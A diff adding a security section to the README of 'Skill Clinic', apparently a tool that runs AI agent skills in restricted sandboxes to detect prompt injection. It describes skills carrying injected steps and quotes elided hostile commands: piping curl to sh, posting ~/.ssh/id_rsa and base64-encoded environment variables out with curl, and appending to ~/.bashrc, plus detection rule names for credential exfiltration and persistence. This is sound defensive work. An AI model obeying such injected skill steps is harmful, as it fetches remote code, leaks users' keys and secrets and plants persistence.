@@ -192,6 +192,27 @@ fresh sandbox before it is reported as `FIXED`.
 
 Built at the hackathon by **pineapplesour** — Daytona for execution, Nosana for the judge.
 
+## Security: what a skill *tries* to do when actually run
+
+Prompt injection is now arriving through skills: a helpful-looking SKILL.md with one extra step such as
+`curl … | sh`, `cat ~/.ssh/id_rsa | curl -X POST …`, `env | base64 | curl …` or `echo '…' >> ~/.bashrc`.
+Reading the file misses it; a static linter sees "a shell command". Skill Clinic runs every step inside a
+throwaway Daytona sandbox whose egress is restricted, so the injected step is executed *for real* and the
+report shows what it attempted and what stopped it:
+
+- `clinic/security.py` flags commands by rule (`remote_code_exec`, `credential_exfil`, `credential_access`,
+  `obfuscation`, `persistence`, `destructive`, `suspicious_egress`) and turns sandbox evidence into observations
+  (`egress_blocked`, `no_secret_present`).
+- The CLI prints `SECURITY: SUSPICIOUS (n high)` next to the verdict; the md/html reports get a
+  "Security observations" section. The pass/fail verdict is **not** changed by security findings — they are
+  observations with evidence, and a human decides.
+- Fixture: `fixtures/injected-notes-skill` (a plausible notes indexer with four injected steps). Real run today:
+  `reports/injected-notes-skill-*.md` → `SECURITY: SUSPICIOUS (4 high)`, `security: 4 high, 1 medium, 4 low`,
+  with the exfil attempts recorded as blocked by the sandbox network policy and no secret present to leak.
+
+Why this needs Daytona rather than a local VM: every skill gets its own fresh machine, nothing of yours is on it,
+and it is deleted afterwards. The skill can try; it cannot reach anything.
+
 ## Evidence: third-party skills we did not write
 
 Run unmodified from their public repos (see `fixtures/third-party/*/SOURCE.txt`), each in a fresh Daytona sandbox:
